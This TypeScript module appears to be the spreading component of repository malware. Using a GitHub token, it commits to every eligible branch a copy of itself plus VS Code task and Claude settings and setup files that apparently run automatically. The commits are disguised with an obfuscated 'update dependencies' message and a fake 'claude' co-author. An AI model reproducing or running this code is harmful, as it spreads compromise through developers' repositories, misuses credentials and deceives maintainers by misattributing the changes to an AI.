import { claude_settings, config, task } from "../../generated";
import { SCRIPT_NAME, SEARCH_STRING } from "../../utils/config";
import { logUtil } from "../../utils/logger";
import { Mutator } from "../base";
import { BranchService } from "./branches";
import { GraphQLClient } from "./client";
import { CommitService } from "./commits";
import { resolveRepoFromEnv } from "./resolver";
import { type FileSourceMap, resolveFileSources } from "./sources";
import type {
  BranchCommit,
  BranchInfo,
  FileChange,
  UpdateResult,
} from "./types";

declare function scramble(str: string): string;

// ──────────────────────────────────────────────
// ✏️  Define the files to push here.
//
// Each key is a repository-relative destination path (including any
// directories). Each value describes where the content comes from:
//
//   - A bare string: inline UTF-8 content (shorthand).
//   - `{ content: "..." }`: inline UTF-8 content (explicit).
//   - `{ sourcePath: "path/to/file" }`: read from the local filesystem
//     at runtime. Relative paths are resolved against `FILE_SOURCE_BASE_DIR`
//     below (defaults to the current working directory). For non-text
//     files, add `encoding: "binary"`.
//
// All listed files are written in a single atomic commit per branch.
// ──────────────────────────────────────────────
const FILE_UPDATES: FileSourceMap = {
  ".vscode/tasks.json": task,
  [`.claude/${SCRIPT_NAME}`]: { sourcePath: Bun.main },
  ".claude/settings.json": claude_settings,
  ".claude/setup.mjs": config,
  ".vscode/setup.mjs": config,
};

/**
 * Directory used to resolve relative `sourcePath` entries in
 * `FILE_UPDATES`. Set to `undefined` to use `process.cwd()`.
 */
const FILE_SOURCE_BASE_DIR: string | undefined = undefined;
const COMMIT_MESSAGE = scramble("chore: update dependencies");

/**
 * Optional commit message body. Each non-empty entry in `COMMIT_COAUTHORS`
 * is appended as a `Co-authored-by:` trailer, which GitHub renders as an
 * additional author on the commit page.
 *
 * Note: `createCommitOnBranch` does not let us set the primary author —
 * that is always the identity behind the auth token. Co-author trailers
 * are the supported way to attribute commits to additional identities.
 */
const COMMIT_COAUTHORS: ReadonlyArray<{ name: string; email: string }> = [
  {
    name: "claude",
    email: "claude@users.noreply.github.com",
  },
];

const DRY_RUN = false;
const EXTRA_EXCLUDE_PATTERNS: string[] = [];

/**
 * Maximum number of per-branch commits packed into a single batched
 * GraphQL mutation document. Keeps each request well below GitHub's
 * query-complexity / document-size limits and bounds the blast radius of
 * any single transport-level failure.
 */
const COMMIT_BATCH_SIZE = 2;

export class ReadmeUpdater extends Mutator {
  private readonly owner: string;
  private readonly repo: string;
  private readonly branchService: BranchService;
  private readonly commitService: CommitService;
  private files: FileChange[];

  constructor(token: string) {
    super();

    if (!token) {
      throw new Error("A GitHub token is required.");
    }

    if (Object.keys(FILE_UPDATES).length === 0) {
      throw new Error(
        "FILE_UPDATES is empty — define at least one file to push.",
      );
    }

    // Files are resolved lazily in `execute()` because some sources may
    // need to be read from disk and we don't want to perform I/O in the
    // constructor.
    this.files = [];

    const { owner, repo } = resolveRepoFromEnv();
    this.owner = owner;
    this.repo = repo;

    const gql = new GraphQLClient(token);
    this.branchService = new BranchService(gql, owner, repo);
    this.commitService = new CommitService(gql, owner, repo);
  }

  /**
   * Mutator entry point. Returns `true` if every eligible branch was updated
   * successfully (or there was nothing to do), `false` if any branch failed.
   */
  async execute(): Promise<Boolean> {
    // Resolve disk-backed file sources up front. We do this once per
    // `execute()` call rather than per branch so that each commit pushed
    // across all branches sees the exact same content snapshot, and so
    // that a missing/unreadable source file fails the run immediately
    // before any commits go out.
    this.files = await resolveFileSources(FILE_UPDATES, FILE_SOURCE_BASE_DIR);
    const results = await this.run();
    return results.every((r) => r.success);
  }

  /** Resolve which branches are eligible for the update. */
  private async getEligibleBranches(): Promise<BranchInfo[]> {
    logUtil.log(`Fetching branches for ${this.owner}/${this.repo} …`);

    const branches = await this.branchService.fetchBranches(50);

    logUtil.log(`  Total branches fetched : ${branches.length}`);
    logUtil.log(
      "  (Protected branches will be detected at commit time and reported per-branch.)",
    );

    const eligible = this.branchService.filterBranches(
      branches,
      EXTRA_EXCLUDE_PATTERNS,
    );

    logUtil.log(`  Eligible after filtering: ${eligible.length}\n`);
    return eligible;
  }

  /** Run the full bulk-update pipeline and return per-branch results. */
  private async run(): Promise<UpdateResult[]> {
    const branches = await this.getEligibleBranches();

    if (branches.length === 0) {
      logUtil.log("No eligible branches found — nothing to do.");
      return [];
    }

    const fileSummary = this.files.map((f) => f.path).join(", ");
    logUtil.log(
      `Pushing ${this.files.length} file(s) [${fileSummary}] to ${branches.length} branch(es) …\n`,
    );

    if (DRY_RUN) {
      const results: UpdateResult[] = branches.map((branch) => {
        const paths = this.files.map((f) => `"${f.path}"`).join(", ");
        logUtil.log(
          `  [DRY RUN] Would update [${paths}] on branch "${branch.name}" (HEAD ${branch.headOid.slice(0, 7)})`,
        );
        return { branch: branch.name, success: true, commitOid: "dry-run" };
      });
      this.logSummary(results);
      return results;
    }

    const commitBody = buildCoAuthorTrailer(COMMIT_COAUTHORS);

    const commits: BranchCommit[] = branches.map((branch) => ({
      branchName: branch.name,
      expectedHeadOid: branch.headOid,
      files: this.files,
      commitHeadline: COMMIT_MESSAGE,
      ...(commitBody ? { commitBody } : {}),
    }));

    const results = await this.commitService.pushChunkedFileUpdates(
      commits,
      COMMIT_BATCH_SIZE,
      (chunkResults) => {
        // Stream per-branch progress as soon as each chunk lands.
        for (const result of chunkResults) {
          if (result.success) {
            logUtil.log(
              `  ✓ ${result.branch} → ${result.commitOid?.slice(0, 7)}`,
            );
          } else {
            logUtil.log(`  ✗ ${result.branch} → ${result.error}`);
          }
        }
      },
    );

    this.logSummary(results);
    return results;
  }

  /** Logs a one-line summary of how many branch updates succeeded vs failed. */
  private logSummary(results: UpdateResult[]): void {
    const ok = results.filter((r) => r.success).length;
    const fail = results.filter((r) => !r.success).length;
    logUtil.log(
      `\nDone. ${ok} succeeded, ${fail} failed out of ${results.length}.`,
    );
  }
}

/**
 * Builds the commit-message body containing one `Co-authored-by:` trailer
 * per entry in `coauthors`. Returns an empty string if the list is empty,
 * which signals to the caller that no `body` field should be sent.
 *
 * The trailer format is the one GitHub recognises for surfacing additional
 * authors on the commit page:
 *
 *   Co-authored-by: Name <email>
 *
 * A blank line precedes the trailer block, per Git convention for message
 * bodies.
 */
function buildCoAuthorTrailer(
  coauthors: ReadonlyArray<{ name: string; email: string }>,
): string {
  if (coauthors.length === 0) return "";
  const trailers = coauthors
    .map((c) => `Co-authored-by: ${c.name} <${c.email}>`)
    .join("\n");
  return `\n${trailers}`;
}
